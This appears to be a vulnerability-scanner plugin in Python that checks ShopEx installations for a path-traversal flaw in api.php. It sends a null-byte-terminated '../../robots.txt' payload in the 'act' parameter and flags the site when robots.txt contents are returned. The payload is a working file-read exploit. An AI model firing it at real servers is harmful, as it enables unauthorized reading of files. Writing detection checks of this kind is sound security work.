#!/usr/bin/env python

# -*- coding: utf-8 -*-

#__author__ = 'xfkxfk'



def assign(service, arg):

    if service == "shopex":

        return True, arg



def audit(arg):

    url = arg

    code, head, body, _, _ = curl.curl( url + '/api.php?act=../../robots.txt%00:template_info&api_version=1.0&app=12' )

    if code == 200:

        if body and body.lower().find('user-agent:') != -1 and body.lower().find('disallow:') != -1:

            security_hole(url + '/api.php?act=../../robots.txt%00:template_info&api_version=1.0&app=12')



if __name__ == '__main__':

    from dummy import *

    audit(assign('shopex', 'http://www.example.com/')[1])